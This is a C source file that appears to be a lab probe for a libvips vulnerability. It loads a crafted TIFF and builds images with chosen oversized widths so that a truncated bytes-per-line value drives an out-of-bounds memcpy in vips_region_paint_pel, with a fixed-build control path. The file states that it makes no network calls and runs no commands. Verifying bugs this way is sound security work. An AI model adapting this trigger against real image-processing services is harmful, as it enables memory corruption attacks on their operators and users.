/* Real-build probe for CVE-2026-69242 inside the lab.
 *
 * Part A: load a crafted TIFF header through the real VipsForeignLoadTiff
 *         and print the real geometry and vips_object_sanity() result.
 * Part B: use the pinned, ASan-instrumented vips_region_image() and
 *         vips_region_paint_pel() on a real VipsImage/VipsRegion pair whose
 *         image data is a small lab buffer (setbuf-equivalent), so the
 *         truncated bpl drives the real memcpy without an 8 GB allocation.
 *
 * No network, no external target, no command execution, no marker claim.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <vips/vips.h>

static void
part_a(const char *path)
{
	VipsImage *im = vips_image_new_from_file(path,
		"access", VIPS_ACCESS_SEQUENTIAL, NULL);
	int sane;

	if (!im) {
		printf("TIFF_LOAD=ERR msg=%s\n", vips_error_buffer());
		vips_error_clear();
		return;
	}
	printf("TIFF_LOAD=OK filename=%s\n", im->filename);
	printf("TIFF_HDR Xsize=%d Ysize=%d Bands=%d BandFmt=%d "
		"sizeof_line=%" G_GUINT64_FORMAT " sizeof_image=%" G_GUINT64_FORMAT "\n",
		im->Xsize, im->Ysize, im->Bands, im->BandFmt,
		VIPS_IMAGE_SIZEOF_LINE(im), VIPS_IMAGE_SIZEOF_IMAGE(im));
	sane = vips_object_sanity(VIPS_OBJECT(im));
	printf("TIFF_SANITY=%d msg=%s\n", sane, vips_error_buffer());
	vips_error_clear();
	g_object_unref(im);
}

static void
part_b(int xsize, int bands, int height, const char *label)
{
	VipsImage *im;
	VipsRegion *reg;
	VipsRect r;
	unsigned char *buf;
	unsigned char ink[4] = { 0x5a, 0x5a, 0x5a, 0x5a };
	guint64 line = (guint64) bands * (guint64) xsize;
	int shift = atoi(getenv("PLACEMENT_SHIFT") ? getenv("PLACEMENT_SHIFT") : "0");
	buf = vips_tracked_malloc(4096);
	memset(buf, 0x11, 4096);

	im = vips_image_new();
	im->Xsize = xsize;
	im->Ysize = height;
	im->Bands = bands;
	im->BandFmt = VIPS_FORMAT_UCHAR;
	im->Coding = VIPS_CODING_NONE;
	im->Type = VIPS_INTERPRETATION_MULTIBAND;
	im->dtype = VIPS_IMAGE_SETBUF;
	im->data = buf + shift;
	reg = vips_region_new(im);
	r.left = 0;
	r.top = 0;
	r.width = 4;
	r.height = 2;
	if (vips_region_image(reg, &r)) {
		printf("%s REGION_ERR=%s\n", label, vips_error_buffer());
		vips_error_clear();
	}
	else {
		VipsRect paint;

		printf("%s LINE=%llu BPL=%d LSKIP=%llu DATA=%p\n",
			label, (unsigned long long) line, reg->bpl,
			(unsigned long long) VIPS_REGION_LSKIP(reg),
			(void *) reg->data);
		paint.left = 0;
		paint.top = 0;
		paint.width = 4;
		paint.height = 2;
		fflush(stdout);
		vips_region_paint_pel(reg, &paint, ink);
		fflush(stdout);
		printf("%s AFTER byte[0]=%02x byte[1]=%02x byte[256]=%02x\n",
			label, buf[0], buf[1], buf[256]);
		fflush(stdout);
	}
	im->data = buf;
	g_object_unref(reg);
	g_object_unref(im);
}

int
main(int argc, char **argv)
{
	if (VIPS_INIT(argv[0]))
		return 1;
	if (argc > 1)
		part_a(argv[1]);

	/* Fixed-build control: sanity rejects the crafted TIFF at load, so
	 * the chain is not attempted. SKIP_CHAIN=1 skips part_b cleanly.
	 */
	if (!getenv("SKIP_CHAIN")) {
		part_b(1073741760, 4, 2, "CRAFT256");
		part_b(1431655765, 3, 2, "CRAFT1");
		part_b(64, 4, 2, "SAFE");
	}
	else {
		printf("CHAIN_SKIPPED=1\n");
		fflush(stdout);
	}

	vips_shutdown();
	return 0;
}
